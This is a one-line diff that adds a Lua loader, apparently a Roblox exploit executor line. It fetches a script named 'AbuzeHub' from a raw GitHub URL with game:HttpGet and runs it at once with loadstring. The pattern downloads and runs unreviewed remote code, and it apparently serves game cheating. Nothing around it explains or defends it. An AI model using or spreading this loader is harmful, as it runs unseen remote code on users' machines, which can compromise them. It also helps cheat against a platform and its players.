@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/uncty/AbuzeHub-V1.0/main/AbuzeHubV1.0.lua'))()
